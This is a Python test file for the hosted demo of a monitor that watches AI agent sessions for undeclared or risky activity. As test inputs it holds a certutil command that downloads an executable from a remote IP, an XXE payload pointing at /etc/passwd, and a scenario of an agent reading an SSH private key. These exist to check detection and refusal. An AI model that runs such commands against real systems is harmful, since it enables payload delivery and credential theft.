"""Functional: the hosted demo (web/app.py) over its real HTTP interface.

Runs the FastAPI app in-process for most checks, and once as a real uvicorn
process driven by web/smoke.py -- the same script CI runs against the built
container and reviewers can run against the deployed URL.

Needs fastapi, httpx and defusedxml (requirements-web.txt), and therefore
Python 3.10+; skipped otherwise.
"""

import json
import os
import socket
import subprocess
import sys
import time
import unittest

from tests.support import REPO, TempDirCase, have, stub_mcp_if_missing

requires_web = unittest.skipUnless(
    have("fastapi") and have("httpx") and have("defusedxml") and have("uvicorn"),
    "requires the web demo dependencies (requirements-web.txt)")

SYSMON_NS = "http://schemas.microsoft.com/win/2004/08/events/event"


def sysmon_exec(pid, image, command_line, ppid=41000):
    return ('<Event xmlns="%s"><System><EventID>1</EventID>'
            '<Channel>Microsoft-Windows-Sysmon/Operational</Channel></System><EventData>'
            '<Data Name="ProcessId">%d</Data><Data Name="ParentProcessId">%d</Data>'
            '<Data Name="Image">%s</Data><Data Name="CommandLine">%s</Data>'
            '</EventData></Event>' % (SYSMON_NS, pid, ppid, image, command_line))


@requires_web
class DemoCase(TempDirCase):
    RATE_LIMIT = 1000

    def setUp(self):
        super().setUp()
        stub_mcp_if_missing()
        from fastapi.testclient import TestClient
        from web.app import DemoConfig, create_app
        self.cfg = DemoConfig(demo_dir=str(self.path("demo")),
                              policy=str(REPO / "policy.windows.yaml"),
                              heartbeat_seconds=0.2, rate_limit_per_minute=self.RATE_LIMIT)
        self.app = create_app(self.cfg)
        self.state = self.app.state.demo
        self.client = TestClient(self.app)
        self.client.__enter__()
        self.addCleanup(self.client.__exit__, None, None, None)

    def get(self, path, **params):
        r = self.client.get(path, params=params)
        self.assertEqual(r.status_code, 200, r.text)
        return r.json()

    def post(self, path, expect=200, **kw):
        r = self.client.post(path, **kw)
        self.assertEqual(r.status_code, expect, r.text)
        return r.json()


class TestSurface(DemoCase):
    def test_health_landing_and_docs(self):
        self.assertEqual(self.get("/healthz")["status"], "ok")
        page = self.client.get("/")
        self.assertEqual(page.status_code, 200)
        self.assertIn("/docs", page.text)
        self.assertIn("Sample data, real pipeline", page.text,
                      "the demo must say plainly that there is no live sensor")
        self.assertEqual(self.client.get("/docs").status_code, 200)

    def test_every_mcp_tool_is_reachable(self):
        from tests.smoke.test_package import EXPECTED_TOOLS
        exposed = set(self.get("/api")["tools"])
        self.assertEqual(exposed, EXPECTED_TOOLS,
                         "the demo must expose exactly the MCP tool set, no more and no less")


class TestSeededScenarios(DemoCase):
    def test_every_scenario_trips_exactly_what_it_documents(self):
        from web import samples
        violations = self.get("/api/list_violations", min_severity="low")["violations"]
        fired = {v["rule"] for e in violations for v in e["verdicts"] if v["verdict"] != "allow"}
        for s in samples.SCENARIOS:
            for rule in s["expect"]["violations"]:
                self.assertIn(rule, fired, "%s: %s did not fire" % (s["name"], rule))

    def test_the_undeclared_credential_read_is_the_only_blind_spot(self):
        b = self.get("/api/find_blind_spots/demo-cred")
        self.assertEqual([(e["kind"], e["data"]["path"]) for e in b["undeclared"]],
                         [("file.read", "C:\\Users\\agent\\.ssh\\id_rsa")],
                         "the bash and python execs are declared by the Bash call; the key read is not")

    def test_the_benign_session_is_fully_declared_and_clean(self):
        self.assertEqual(self.get("/api/session_summary/demo-benign")["rules_tripped"], {})
        self.assertEqual(self.get("/api/find_blind_spots/demo-benign")["undeclared"], [])

    def test_unhooked_activity_stays_unattributed(self):
        h = self.get("/api/attribution_health")
        self.assertGreater(h["unattributed"], 0)
        self.assertIn("process.exec", h["by_kind"])

    def test_sample_sessions_need_include_dead(self):
        self.assertEqual(self.get("/api/list_sessions")["count"], 0)
        ids = {s["session_id"] for s in self.get("/api/list_sessions", include_dead="true")["sessions"]}
        self.assertEqual(ids, {"demo-benign", "demo-cred", "demo-config"})

    def test_the_chain_verifies(self):
        self.assertTrue(self.get("/api/verify_log_integrity")["ok"])


class TestHonesty(DemoCase):
    def test_the_monitor_is_running_but_not_kernel_level(self):
        self.state.monitor.check_health()
        cov = self.get("/api/control_coverage")
        self.assertTrue(cov["monitor"]["running"])
        self.assertFalse(cov["monitor"]["kernel_collector_alive"],
                         "a replay feed is not a sensor, and must not be reported as one")
        self.assertEqual(cov["collectors_running"], ["demo-replay"])

    def test_kill_is_recorded_and_never_sent(self):
        import gm.monitor as monitor_module

        def forbidden(*a, **k):
            raise AssertionError("the hosted demo called os.kill")

        original = monitor_module.os.kill
        monitor_module.os.kill = forbidden
        self.addCleanup(setattr, monitor_module.os, "kill", original)
        out = self.post("/demo/scenarios/agent-edits-its-guardrails")
        self.assertEqual([r["kind"] for r in out["enforcement"]], ["enforce.simulated"])
        self.assertEqual(out["violations"], ["fs.agent_config_write"])

    def test_the_probe_suite_touches_nothing_and_tells_live_from_dead(self):
        import gm.probes as probes_module

        def forbidden(*a, **k):
            raise AssertionError("the hosted demo spawned a process")

        original = probes_module.subprocess.run
        probes_module.subprocess.run = forbidden
        self.addCleanup(setattr, probes_module.subprocess, "run", original)
        live = self.post("/api/run_probe_suite", params={"collector": "live"})
        dead = self.post("/api/run_probe_suite", params={"collector": "dead"})
        self.assertEqual((live["passed"], live["total"], live["simulated"]), (4, 4, True))
        self.assertEqual((dead["passed"], dead["total"]), (0, 4))
        self.assertFalse(os.path.exists("C:\\Users\\agent\\.gm-canaries") and sys.platform != "win32")


class TestInput(DemoCase):
    def test_a_custom_sysmon_event_runs_through_the_real_pipeline(self):
        out = self.post("/demo/windows-event", json={"xml": sysmon_exec(
            41801, "C:\\Windows\\System32\\certutil.exe",
            "certutil -urlcache -split -f http://203.0.113.7/x.exe")})
        rec, = out["records"]
        self.assertEqual((rec["src"], rec["kind"], rec["pid"]), ("sysmon", "process.exec", 41801))
        self.assertEqual(out["violations"], ["exec.lolbin_download"])
        self.assertIn("exec.lolbin_download",
                      {a["rule"] for a in self.get("/demo/alerts")["alerts"]})

    def test_a_hook_then_an_exec_is_attributed_to_the_session(self):
        self.post("/demo/hook", json={"session_id": "reviewer-1", "tool_name": "Bash",
                                      "tool_input": {"command": "python build.py"},
                                      "agent_pid": 42100})
        out = self.post("/demo/windows-event", json={"xml": sysmon_exec(
            42101, "C:\\Python312\\python.exe", "python build.py", ppid=42100)})
        self.assertEqual(out["records"][0]["session"], "reviewer-1")
        self.assertEqual(self.get("/api/find_blind_spots/reviewer-1")["undeclared"], [])

    def test_entity_and_dtd_payloads_are_refused(self):
        for xml in ('<?xml version="1.0"?><!DOCTYPE e [<!ENTITY a "b">]><Event>&a;</Event>',
                    '<!DOCTYPE e SYSTEM "file:///etc/passwd"><Event/>'):
            self.post("/demo/windows-event", expect=400, json={"xml": xml})

    def test_malformed_unsupported_and_oversized_input(self):
        self.post("/demo/windows-event", expect=400, json={"xml": "<Event><unclosed>"})
        wrong = sysmon_exec(1, "x", "y").replace("Microsoft-Windows-Sysmon/Operational", "Application")
        self.post("/demo/windows-event", expect=422, json={"xml": wrong})
        unmapped = sysmon_exec(1, "x", "y").replace("<EventID>1<", "<EventID>7<")
        self.post("/demo/windows-event", expect=422, json={"xml": unmapped})
        big = sysmon_exec(1, "x", "y" * 70000)
        self.post("/demo/windows-event", expect=413, json={"xml": big})
        r = self.client.post("/demo/windows-event", content=b"x" * 300000,
                             headers={"Content-Type": "application/json"})
        self.assertEqual(r.status_code, 413)

    def test_unknown_scenario(self):
        self.post("/demo/scenarios/no-such-thing", expect=404)


class TestSharedStateStaysSmall(DemoCase):
    def events(self):
        return len(list(self.state.monitor.store.scan()))

    def test_reset_restores_the_seed(self):
        seeded = self.events()
        self.post("/demo/scenarios/unhooked-persistence")
        self.assertGreater(self.events(), seeded)
        self.assertEqual(self.post("/demo/reset")["events"], seeded)
        self.assertTrue(self.get("/api/verify_log_integrity")["ok"])

    def test_a_stale_demo_is_reseeded_on_the_next_request(self):
        seeded = self.events()
        self.post("/demo/scenarios/unhooked-persistence")
        self.state.seeded_at -= 31 * 60
        self.get("/api/list_violations")
        self.assertEqual(self.events(), seeded)

    def test_an_oversized_log_is_reseeded(self):
        seeded = self.events()
        self.post("/demo/scenarios/unhooked-persistence")
        self.state.cfg.max_log_bytes = 1
        self.get("/api/list_violations")
        self.state.cfg.max_log_bytes = 2000000
        self.assertEqual(self.events(), seeded)


class TestRateLimit(DemoCase):
    RATE_LIMIT = 2

    def test_writes_are_limited_per_client_and_reads_are_not(self):
        self.post("/demo/scenarios/benign-edit-and-test")
        self.post("/demo/scenarios/benign-edit-and-test")
        r = self.client.post("/demo/scenarios/benign-edit-and-test")
        self.assertEqual(r.status_code, 429)
        self.assertEqual(r.headers.get("Retry-After"), "60")
        for _ in range(5):
            self.get("/api/list_violations")


@requires_web
class TestServedByUvicorn(TempDirCase):
    """The container's command, as a real process, checked by the shipped smoke script."""

    def free_port(self):
        s = socket.socket()
        s.bind(("127.0.0.1", 0))
        port = s.getsockname()[1]
        s.close()
        return port

    def test_smoke_script_passes_against_a_live_server(self):
        port = self.free_port()
        env = dict(os.environ)
        env.update({"PYTHONPATH": str(REPO), "GM_DEMO_DIR": str(self.path("demo"))})
        log = open(str(self.path("uvicorn.log")), "wb")
        self.addCleanup(log.close)
        proc = subprocess.Popen([sys.executable, "-m", "uvicorn", "web.app:app",
                                 "--host", "127.0.0.1", "--port", str(port)],
                                cwd=str(REPO), env=env, stdin=subprocess.DEVNULL,
                                stdout=log, stderr=subprocess.STDOUT)
        self.addCleanup(self._stop, proc)
        smoke = subprocess.run([sys.executable, str(REPO / "web" / "smoke.py"),
                                "http://127.0.0.1:%d" % port, "--wait", "60"],
                               stdout=subprocess.PIPE, stderr=subprocess.STDOUT, timeout=240)
        out = smoke.stdout.decode("utf-8", "replace")
        self.assertEqual(smoke.returncode, 0, out + "\n--- uvicorn ---\n" +
                         self.path("uvicorn.log").read_text(encoding="utf-8", errors="replace"))
        self.assertNotIn("FAIL", out)

    @staticmethod
    def _stop(proc):
        proc.terminate()
        try:
            proc.wait(15)
        except Exception:
            proc.kill()
            proc.wait(15)


if __name__ == "__main__":
    unittest.main()
